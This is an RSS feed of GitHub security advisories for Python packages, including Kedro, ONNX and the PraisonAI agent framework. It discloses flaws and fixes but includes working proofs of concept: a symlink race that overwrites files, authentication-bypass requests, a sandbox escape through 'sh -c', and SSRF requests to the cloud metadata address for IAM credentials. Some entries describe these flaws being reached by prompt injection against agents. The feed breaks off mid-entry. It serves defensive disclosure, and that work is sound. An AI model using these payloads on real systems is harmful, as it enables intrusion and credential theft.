<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-04-03T13:25:45.619Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[ajenti-panel] Ajenti has an authorization bypass during custom package installation]]></title>
        <id>https://github.com/advisories/GHSA-73jv-44c3-j5p2</id>
        <link href="https://github.com/advisories/GHSA-73jv-44c3-j5p2"/>
        <updated>2026-04-03T03:57:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An authenticated user (using the <code>auth_users</code> plugin authentication method) could install a custom package even if this user is not superuser.</p>
<h3 id="patches">Patches</h3>
<p>This is fixed in the version 2.2.15. Users should upgrade to this version as soon as possible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ajenti/ajenti/security/advisories/GHSA-73jv-44c3-j5p2">https://github.com/ajenti/ajenti/security/advisories/GHSA-73jv-44c3-j5p2</a></li>
<li><a href="https://github.com/ajenti/ajenti/releases/tag/v2.2.15">https://github.com/ajenti/ajenti/releases/tag/v2.2.15</a></li>
<li><a href="https://github.com/advisories/GHSA-73jv-44c3-j5p2">https://github.com/advisories/GHSA-73jv-44c3-j5p2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73jv-44c3-j5p2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T03:57:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kedro] Kedro has Arbitrary Code Execution via Malicious Logging Configuration]]></title>
        <id>https://github.com/advisories/GHSA-9cqf-439c-j96r</id>
        <link href="https://github.com/advisories/GHSA-9cqf-439c-j96r"/>
        <updated>2026-04-03T03:48:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This is a <strong>critical Remote Code Execution (RCE)</strong> vulnerability caused by unsafe use of <code>logging.config.dictConfig()</code> with user-controlled input.</p>
<p>Kedro allows the logging configuration file path to be set via the <code>KEDRO_LOGGING_CONFIG</code> environment variable and loads it without validation. The logging configuration schema supports the special <code>()</code> key, which enables arbitrary callable instantiation. An attacker can exploit this to execute arbitrary system commands during application startup.</p>
<hr>
<h3 id="patches">Patches</h3>
<p>The vulnerability is fixed by introducing validation that rejects the unsafe <code>()</code> factory key in logging configurations before passing them to <code>dictConfig()</code>.</p>
<h4 id="fixed-in">Fixed in</h4>
<ul>
<li>Kedro 1.3.0</li>
</ul>
<p>Users should upgrade to this version as soon as possible.</p>
<hr>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible:</p>
<ul>
<li>Do not allow untrusted input to control the <code>KEDRO_LOGGING_CONFIG</code> environment variable  </li>
<li>Restrict write access to logging configuration files  </li>
<li>Avoid using externally supplied or dynamically generated logging configs  </li>
<li>Manually validate logging YAML to ensure it does not contain the <code>()</code> key</li>
</ul>
<p>These mitigations reduce risk but do not fully eliminate it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kedro-org/kedro/security/advisories/GHSA-9cqf-439c-j96r">https://github.com/kedro-org/kedro/security/advisories/GHSA-9cqf-439c-j96r</a></li>
<li><a href="https://github.com/advisories/GHSA-9cqf-439c-j96r">https://github.com/advisories/GHSA-9cqf-439c-j96r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cqf-439c-j96r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-03T03:48:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kedro] Kedro: Path Traversal in versioned dataset loading via unsanitized version string]]></title>
        <id>https://github.com/advisories/GHSA-6326-w46w-ppjw</id>
        <link href="https://github.com/advisories/GHSA-6326-w46w-ppjw"/>
        <updated>2026-04-03T03:46:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>_get_versioned_path()</code> method in kedro/io/core.py constructs filesystem paths by directly interpolating user-supplied version strings without sanitization. Because version strings are used as path components, traversal sequences such as ../ are preserved and can escape the intended versioned dataset directory.
This is reachable through multiple entry points: <code>catalog.load(..., version=...)</code>, <code>DataCatalog.from_config(..., load_versions=...)</code>, and the CLI via <code>kedro run --load-versions=dataset:../../../secrets</code>. An attacker who can influence the version string can force Kedro to load files from outside the intended version directory, enabling unauthorized file reads, data poisoning, or cross-tenant data access in shared environments.</p>
<h3 id="patches">Patches</h3>
<p>Yes. Fixed in kedro version 1.3.0. Users should upgrade to kedro &gt;= 1.3.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Validate version strings before passing them to DataCatalog or the CLI, ensuring they do not contain <code>..</code> segments, path separators, or absolute paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kedro-org/kedro/security/advisories/GHSA-6326-w46w-ppjw">https://github.com/kedro-org/kedro/security/advisories/GHSA-6326-w46w-ppjw</a></li>
<li><a href="https://github.com/kedro-org/kedro/pull/5442">https://github.com/kedro-org/kedro/pull/5442</a></li>
<li><a href="https://github.com/advisories/GHSA-6326-w46w-ppjw">https://github.com/advisories/GHSA-6326-w46w-ppjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6326-w46w-ppjw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T03:46:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dtale] D-Tale: Remote Code Execution through redis/shelf storage]]></title>
        <id>https://github.com/advisories/GHSA-436g-fhfc-9g5w</id>
        <link href="https://github.com/advisories/GHSA-436g-fhfc-9g5w"/>
        <updated>2026-04-03T03:44:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users hosting D-Tale publicly while using a redis or shelf storage layer could be vulnerable to remote code execution allowing attackers to run malicious code on the server.</p>
<h3 id="patches">Patches</h3>
<p>Users should upgrade to version 3.22.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds for versions &lt; 3.22.0</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/man-group/dtale/security/advisories/GHSA-436g-fhfc-9g5w">https://github.com/man-group/dtale/security/advisories/GHSA-436g-fhfc-9g5w</a></li>
<li><a href="https://github.com/advisories/GHSA-436g-fhfc-9g5w">https://github.com/advisories/GHSA-436g-fhfc-9g5w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-436g-fhfc-9g5w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-03T03:44:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[onnx] ONNX: TOCTOU arbitrary file read/write in save_external_dat ]]></title>
        <id>https://github.com/advisories/GHSA-q56x-g2fj-4rj6</id>
        <link href="https://github.com/advisories/GHSA-q56x-g2fj-4rj6"/>
        <updated>2026-04-01T23:40:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>save_external_data</code> method seems to include multiple issues introducing a local TOCTOU vulnerability, an arbitrary file read/write on any system. It potentially includes a path validation bypass on Windows systems.
Regarding the TOCTOU, an attacker seems to be able to overwrite victim's files via symlink following under the same privilege scope.
The mentioned function can be found here: <a href="https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L188">https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L188</a></p>
<h3 id="details">Details</h3>
<h4 id="toctou">TOCTOU</h4>
<p>The vulnerable code pattern:</p>
<pre><code class="language-python">   # CHECK - Is this a file?
   if not os.path.isfile(external_data_file_path):
       # Line 228-229: USE #1 - Create if it doesn't exist
       with open(external_data_file_path, "ab"):
           pass
   
   # Open for writing
   with open(external_data_file_path, "r+b") as data_file:
       # Lines 233-243: Write tensor data
       data_file.seek(0, 2)
       if info.offset is not None:
           file_size = data_file.tell()
           if info.offset &gt; file_size:
               data_file.write(b"\0" * (info.offset - file_size))
           data_file.seek(info.offset)
       offset = data_file.tell()
       data_file.write(tensor.raw_data)
</code></pre>
<p>There is a time gap between <code>os.path.isfile</code> and <code>open</code> with no atomic file creation flags (e.g. <code>O_EXCEL | O_CREAT</code>) allowing the attacker to create a symlink that is being followed (absence of <code>O_NOFOLLOW</code>), between these two calls. By combining these, the attack is possible as shown below in the PoC section.</p>
<h4 id="bypass">Bypass</h4>
<p>There is also a potential validation bypass on Windows systems in the same method (<a href="https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L203">https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L203</a>) alloing absolute paths like <code>C:\</code> (only 1 part):</p>
<pre><code class="language-python">if location_path.is_absolute() and len(location_path.parts) &gt; 1
</code></pre>
<p>This may allow Windows Path Traversals (not 100% verified as I am emulating things on a Debian distro).</p>
<h3 id="poc">PoC</h3>
<p>Install the dependencies and run this:</p>
<pre><code class="language-python">mport os
import sys
import tempfile
import numpy as np
import onnx
from onnx import TensorProto, helper
from onnx.numpy_helper import from_array

# Create a temporary directory for our poc
with tempfile.TemporaryDirectory() as tmpdir:
    print(f"[*] Working directory: {tmpdir}")

    # Create a "sensitive" file that we'll overwrite
    sensitive_file = os.path.join(tmpdir, "sensitive.txt")
    with open(sensitive_file, 'w') as f:
        f.write("SENSITIVE DATA - DO NOT OVERWRITE")

    original_content = open(sensitive_file, 'rb').read()
    print(f"[*] Created sensitive file: {sensitive_file}")
    print(f"    Original content: {original_content}")

    # Create a simple ONNX model with a large tensor
    print("[*] Creating ONNX model with external data...")

    # Create a tensor with data &gt; 1KB (to trigger external data)
    large_array = np.ones((100, 100), dtype=np.float32)  # 40KB tensor
    large_tensor = from_array(large_array, name='large_weight')

    # Create a minimal model
    model = helper.make_model(
        helper.make_graph(
            [helper.make_node('Identity', ['input'], ['output'])],
            'minimal_model',
            [helper.make_tensor_value_info('input', TensorProto.FLOAT, [100, 100])],
            [helper.make_tensor_value_info('output', TensorProto.FLOAT, [100, 100])],
            [large_tensor]
        )
    )

    # Save model with external data to create the external data file
    model_path = os.path.join(tmpdir, "model.onnx")
    external_data_name = "data.bin"
    external_data_path = os.path.join(tmpdir, external_data_name)

    onnx.save_model(
        model, 
        model_path,
        save_as_external_data=True,
        all_tensors_to_one_file=True,
        location=external_data_name,
        size_threshold=1024
    )

    print(f"[+] Model saved: {model_path}")
    print(f"[+] External data created: {external_data_path}")

    # Now comes the attack: replace the external data file with a symlink
    print("[!] ATTACK: Replacing external data file with symlink...")

    # Remove the legitimate external data file
    if os.path.exists(external_data_path):
        os.remove(external_data_path)
        print(f"    Removed: {external_data_path}")

    # Create symlink pointing to sensitive file
    os.symlink(sensitive_file, external_data_path)
    print(f"    Created symlink: {external_data_path} -&gt; {sensitive_file}")

    # Now load and re-save the model, which will trigger the vulnerability
    print("Loading model and saving with external data...")
    try:
        # Load the model (without loading external data)
        loaded_model = onnx.load(model_path, load_external_data=False)

        # Modify the model slightly (to ensure we write new data)
        loaded_model.graph.initializer[0].raw_data = large_array.tobytes()

        # Save again - this will call save_external_data() and follow the symlink
        onnx.save_model(
            loaded_model,
            model_path,
            save_as_external_data=True,
            all_tensors_to_one_file=True,
            location=external_data_name,
            size_threshold=1024
        )
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # Check if the sensitive file was overwritten
    print("[*] Checking if sensitive file was modified...")
    modified_content = open(sensitive_file, 'rb').read()
    
    print(f"    Original size: {len(original_content)} bytes")
    print(f"    Current size:  {len(modified_content)} bytes")
    print(f"    Original content: {original_content[:50]}")
    print(f"    Current content:  {modified_content[:50]}...")
    print()
    
    if modified_content != original_content:
        print("[!] Success!")
    else:
        print("[-] Failure")
</code></pre>
<p>Output:</p>
<pre><code>[*] Working directory: /tmp/tmpqy7z88_l
[*] Created sensitive file: /tmp/tmpqy7z88_l/sensitive.txt
    Original content: b'SENSITIVE DATA - DO NOT OVERWRITE'

[*] Creating ONNX model with external data...
[+] Model saved: /tmp/tmpqy7z88_l/model.onnx
[+] External data created: /tmp/tmpqy7z88_l/data.bin
[!] ATTACK: Replacing external data file with symlink...
    Removed: /tmp/tmpqy7z88_l/data.bin
    Created symlink: /tmp/tmpqy7z88_l/data.bin -&gt; /tmp/tmpqy7z88_l/sensitive.txt
Loading model and saving with external data...
[*] Checking if sensitive file was modified...
    Original size: 33 bytes
    Current size:  40033 bytes
    Original content: b'SENSITIVE DATA - DO NOT OVERWRITE'
    Current content:  b'SENSITIVE DATA - DO NOT OVERWRITE\x00\x00\x80?\x00\x00\x80?\x00\x00\x80?\x00\x00\x80?\x00'...
</code></pre>
<p>Successfully overwritting the "sensitive data" file.</p>
<h3 id="impact">Impact</h3>
<p>The impact may include filesystem injections (e.g. on ssh keys, shell configs, crons) or destruction of files, affecting integrity and availability.</p>
<h3 id="mitigations">Mitigations</h3>
<ol>
<li>Atomic file creation</li>
<li>Symlink protection</li>
<li>Path canonicalization</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/onnx/onnx/security/advisories/GHSA-q56x-g2fj-4rj6">https://github.com/onnx/onnx/security/advisories/GHSA-q56x-g2fj-4rj6</a></li>
<li><a href="https://github.com/advisories/GHSA-q56x-g2fj-4rj6">https://github.com/advisories/GHSA-q56x-g2fj-4rj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q56x-g2fj-4rj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T23:40:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai] PraisonAI Has Authentication Bypass via OAuthManager.validate_token()]]></title>
        <id>https://github.com/advisories/GHSA-98f9-fqg5-hvq5</id>
        <link href="https://github.com/advisories/GHSA-98f9-fqg5-hvq5"/>
        <updated>2026-04-01T23:29:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>OAuthManager.validate_token()</code> returns <code>True</code> for any token not found in its internal store, which is empty by default. Any HTTP request to the MCP server with an arbitrary Bearer token is treated as authenticated, granting full access to all registered tools and agent capabilities.</p>
<h3 id="details">Details</h3>
<p><code>oauth.py:364</code> (source) -&gt; <code>oauth.py:374</code> (loop miss) -&gt; <code>oauth.py:381</code> (sink)</p>
<pre><code class="language-python"># source
def validate_token(self, token: str) -&gt; bool:
    for stored_token in self._tokens.values():
        if stored_token.access_token == token:
            return not stored_token.is_expired()

# sink -- _tokens is empty by default, loop never executes, falls through
    return True
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash"># install: pip install -e src/praisonai
# start server: praisonai mcp serve --transport http-stream --port 8080

curl -s -X POST http://127.0.0.1:8080/mcp \
  -H "Authorization: Bearer fake_token_abc123" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/list","id":1}'

# expected output: 200 OK with full tool list (50+ tools)
# including praisonai.agent.run, praisonai.workflow.run, praisonai.containers.file_write
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any unauthenticated attacker with network access to the MCP HTTP server can call all registered tools including agent execution, workflow runs, container file read/write, and skill loading. The server binds to <code>0.0.0.0</code> by default with no API key required.</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<pre><code class="language-python">def validate_token(self, token: str) -&gt; bool:
    for stored_token in self._tokens.values():
        if stored_token.access_token == token:
            return not stored_token.is_expired()
    # Unknown tokens must be rejected.
    # For external/JWT tokens, call the introspection endpoint here before returning.
    return False
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-98f9-fqg5-hvq5">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-98f9-fqg5-hvq5</a></li>
<li><a href="https://github.com/advisories/GHSA-98f9-fqg5-hvq5">https://github.com/advisories/GHSA-98f9-fqg5-hvq5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-98f9-fqg5-hvq5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-01T23:29:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai] PraisonAI Has Missing Authentication in WebSocket Gateway]]></title>
        <id>https://github.com/advisories/GHSA-cfh6-vr3j-qc3g</id>
        <link href="https://github.com/advisories/GHSA-cfh6-vr3j-qc3g"/>
        <updated>2026-04-01T23:28:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The PraisonAI Gateway server accepts WebSocket connections at <code>/ws</code> and serves agent topology at <code>/info</code> with no authentication. Any network client can connect, enumerate registered agents, and send arbitrary messages to agents and their tool sets.</p>
<h3 id="details">Details</h3>
<p><code>gateway/server.py:242</code> (source) -&gt; <code>gateway/server.py:250</code> (sink)</p>
<pre><code class="language-python"># source -- /info leaks all agent IDs with no auth
async def info(request):
    return JSONResponse({
        "agents": list(self._agents.keys()),
        "sessions": len(self._sessions),
        "clients": len(self._clients),
    })

# sink -- WebSocket accepted unconditionally, no token check
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = str(uuid.uuid4())
    self._clients[client_id] = websocket
    # processes any message from any client
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash"># tested on: praisonai==4.5.87 (source install)
# install: pip install -e src/praisonai
# start server:
# python3 -c "import asyncio; from praisonai.gateway.server import WebSocketGateway; asyncio.run(WebSocketGateway(host='127.0.0.1', port=8765).start())" &amp;

# Step 1 - enumerate agents, no auth
curl -s http://127.0.0.1:8765/info
# expected output: {"name":"PraisonAI Gateway","version":"1.0.0","agents":[...],"sessions":0,"clients":0}

# Step 2 - connect to WebSocket, no token
python3 -c "
import asyncio, websockets, json
async def run():
    async with websockets.connect('ws://127.0.0.1:8765/ws') as ws:
        print('Connected with no auth')
        await ws.send(json.dumps({'type': 'join', 'agent_id': 'assistant'}))
        print(await asyncio.wait_for(ws.recv(), timeout=3))
asyncio.run(run())
"
# expected output: Connected with no auth
# {"type": ...} -- server responds, connection accepted
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any unauthenticated attacker with network access can connect to the WebSocket gateway, enumerate all registered agents via <code>/info</code>, and send arbitrary messages to agents including tool execution, file reads, and API calls. <code>GatewayConfig</code> has an <code>auth_token</code> field that is never enforced in the handler.</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<pre><code class="language-python">async def websocket_endpoint(websocket: WebSocket):
    token = websocket.query_params.get("token") or \
            websocket.headers.get("Authorization", "").removeprefix("Bearer ")
    if self._config.auth_token and token != self._config.auth_token:
        await websocket.close(code=4001, reason="Unauthorized")
        return
    await websocket.accept()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-cfh6-vr3j-qc3g">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-cfh6-vr3j-qc3g</a></li>
<li><a href="https://github.com/advisories/GHSA-cfh6-vr3j-qc3g">https://github.com/advisories/GHSA-cfh6-vr3j-qc3g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfh6-vr3j-qc3g</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-01T23:28:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonaiagents] PraisonAI Has SSRF in FileTools.download_file() via Unvalidated URL]]></title>
        <id>https://github.com/advisories/GHSA-44c2-3rw4-5gvh</id>
        <link href="https://github.com/advisories/GHSA-44c2-3rw4-5gvh"/>
        <updated>2026-04-01T23:27:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>FileTools.download_file()</code> in <code>praisonaiagents</code> validates the destination path but performs no validation on the <code>url</code> parameter, passing it directly to <code>httpx.stream()</code> with <code>follow_redirects=True</code>. An attacker who controls the URL can reach any host accessible from the server including cloud metadata services and internal network services.</p>
<h3 id="details">Details</h3>
<p><code>file_tools.py:259</code> (source) -&gt; <code>file_tools.py:296</code> (sink)</p>
<pre><code class="language-python"># source -- url taken directly from caller, no validation
def download_file(self, url: str, destination: str, ...):

# sink -- unvalidated url passed to httpx with redirect following
    with httpx.stream("GET", url, timeout=timeout, follow_redirects=True) as response:
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash"># tested on: praisonaiagents==1.5.87 (source install)
# install: pip install -e src/praisonai-agents
# start listener: python3 -m http.server 8888

import os
os.environ['PRAISONAI_AUTO_APPROVE'] = 'true'
from praisonaiagents.tools.file_tools import download_file

result = download_file(
    url="http://127.0.0.1:8888/ssrf-test",
    destination="/tmp/ssrf_out.txt"
)
print(result)
# listener logs: "GET /ssrf-test HTTP/1.1" 404
# on EC2 with IMDSv1: url="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# writes IAM credentials to destination file
</code></pre>
<h3 id="impact">Impact</h3>
<p>On cloud infrastructure with IMDSv1 enabled, an attacker can retrieve IAM credentials via the EC2 metadata service and write them to disk for subsequent agent steps to exfiltrate. <code>follow_redirects=True</code> enables open-redirect chaining to bypass partial URL filters. Reachable via indirect prompt injection with no authentication required.</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<pre><code class="language-python">from urllib.parse import urlparse
import ipaddress

BLOCKED_NETWORKS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
]

def _validate_url(url: str) -&gt; None:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError(f"Scheme {parsed.scheme!r} not allowed")
    try:
        addr = ipaddress.ip_address(parsed.hostname)
        for net in BLOCKED_NETWORKS:
            if addr in net:
                raise ValueError(f"Requests to {addr} are not permitted")
    except ValueError as e:
        if "does not appear to be" not in str(e):
            raise
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-44c2-3rw4-5gvh">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-44c2-3rw4-5gvh</a></li>
<li><a href="https://github.com/advisories/GHSA-44c2-3rw4-5gvh">https://github.com/advisories/GHSA-44c2-3rw4-5gvh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-44c2-3rw4-5gvh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T23:27:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai] PraisonAI Has Sandbox Escape via shell=True and Bypassable Blocklist in SubprocessSandbox]]></title>
        <id>https://github.com/advisories/GHSA-r4f2-3m54-pp7q</id>
        <link href="https://github.com/advisories/GHSA-r4f2-3m54-pp7q"/>
        <updated>2026-04-01T23:26:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>SubprocessSandbox</code> in all modes (BASIC, STRICT, NETWORK_ISOLATED) calls <code>subprocess.run()</code> with <code>shell=True</code> and relies solely on string-pattern matching to block dangerous commands. The blocklist does not include <code>sh</code> or <code>bash</code> as standalone executables, allowing trivial sandbox escape in STRICT mode via <code>sh -c '&lt;command&gt;'</code>.</p>
<h3 id="details">Details</h3>
<p><code>sandbox_executor.py:179</code> (source) -&gt; <code>sandbox_executor.py:326</code> (sink)</p>
<pre><code class="language-python"># source -- string-pattern blocklist, sh and bash not in blocked_commands
cmd_name = Path(parts[0]).name
if cmd_name in self.policy.blocked_commands:  # sh, bash not blocked
    raise SecurityError(...)
dangerous_patterns = [
    ("| sh",   ...),   # requires space -- "id|bash" evades this
    ("| bash", ...),   # requires space
]

# sink -- shell=True spawns /bin/sh regardless of sandbox mode
result = subprocess.run(
    command,
    shell=True,
    ...
)
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># tested on: praisonai==4.5.87 (source install)
# install: pip install -e src/praisonai
import sys
sys.path.insert(0, 'src/praisonai')
from praisonai.cli.features.sandbox_executor import SubprocessSandbox, SandboxPolicy, SandboxMode

policy = SandboxPolicy.for_mode(SandboxMode.STRICT)
sandbox = SubprocessSandbox(policy=policy)

result = sandbox.execute("sh -c 'id'")
print(result.stdout)
# expected output: uid=1000(narey) gid=1000(narey) groups=1000(narey)...
</code></pre>
<h3 id="impact">Impact</h3>
<p>Users who deploy with <code>--sandbox strict</code> have no meaningful OS-level isolation. Any command blocked by the policy (curl, wget, nc, ssh) is trivially reachable via <code>sh -c '&lt;blocked_command&gt;'</code>. Combined with agent prompt injection, an attacker can escape the sandbox and reach the network, filesystem, and cloud metadata services.</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<pre><code class="language-python">import shlex

result = subprocess.run(
    shlex.split(command),
    shell=False,
    cwd=cwd,
    env=env,
    capture_output=capture_output,
    text=True,
    timeout=timeout
)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-r4f2-3m54-pp7q">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-r4f2-3m54-pp7q</a></li>
<li><a href="https://github.com/advisories/GHSA-r4f2-3m54-pp7q">https://github.com/advisories/GHSA-r4f2-3m54-pp7q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r4f2-3m54-pp7q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T23:26:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai] PraisonAI: SSRF via Unvalidated api_base in passthrough() Fallback]]></title>
        <id>https://github.com/advisories/GHSA-x6m9-gxvr-7jpv</id>
        <link href="https://github.com/advisories/GHSA-x6m9-gxvr-7jpv"/>
        <updated>2026-04-01T23:21:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>passthrough()</code> and <code>apassthrough()</code> in <code>praisonai</code> accept a caller-controlled <code>api_base</code> parameter that is concatenated with <code>endpoint</code> and passed directly to <code>httpx.Client.request()</code> when the litellm primary path raises <code>AttributeError</code>. No URL scheme validation, private IP filtering, or domain allowlist is applied, allowing requests to any host reachable from the server.</p>
<h3 id="details">Details</h3>
<p><code>passthrough.py:92</code> (source) -&gt; <code>passthrough.py:109</code> (fallback trigger) -&gt; <code>passthrough.py:110</code> (sink)</p>
<pre><code class="language-python"># source -- api_base taken directly from caller
def passthrough(endpoint, api_base=None, method="GET", ...):

# fallback trigger -- AttributeError from unrecognised provider enters fallback
except AttributeError:
    url = f"{api_base or 'https://api.openai.com'}{endpoint}"

# sink -- no validation before request
    response = client.request(method, url=url, ...)
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># tested on: praisonai 1.5.87 (source install)
# install: pip install -e src/praisonai
# start listener: python3 -m http.server 8888
import sys, litellm
sys.path.insert(0, 'src/praisonai')
del litellm.llm_passthrough_route

from praisonai.capabilities.passthrough import passthrough

result = passthrough(
    endpoint="/ssrf-test",
    api_base="http://127.0.0.1:8888",
    method="GET",
    custom_llm_provider="__nonexistent__",
)
print(result)
# expected output: PassthroughResult(data='...', status_code=404, headers={'server': 'SimpleHTTP/0.6 Python/3.12.3', ...})
# listener logs: "GET /ssrf-test HTTP/1.1" 404
# on EC2 with IMDSv1: api_base="http://169.254.169.254" returns IAM credentials
</code></pre>
<h3 id="impact">Impact</h3>
<p>On cloud infrastructure with IMDSv1 enabled, an attacker can retrieve IAM credentials via the EC2 metadata service. Internal services (Redis, Elasticsearch, Kubernetes API) are reachable without authentication from within the VPC. The Flask API server deploys with <code>AUTH_ENABLED = False</code> by default, making this reachable over the network without credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-x6m9-gxvr-7jpv">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-x6m9-gxvr-7jpv</a></li>
<li><a href="https://github.com/advisories/GHSA-x6m9-gxvr-7jpv">https://github.com/advisories/GHSA-x6m9-gxvr-7jpv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x6m9-gxvr-7jpv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T23:21:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai] PraisonAI Has ReDoS via Unvalidated User-Controlled Regex in MCPToolIndex.search_tools()]]></title>
        <id>https://github.com/advisories/GHSA-8w9j-hc3g-3g7f</id>
        <link href="https://github.com/advisories/GHSA-8w9j-hc3g-3g7f"/>
        <updated>2026-04-01T23:21:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
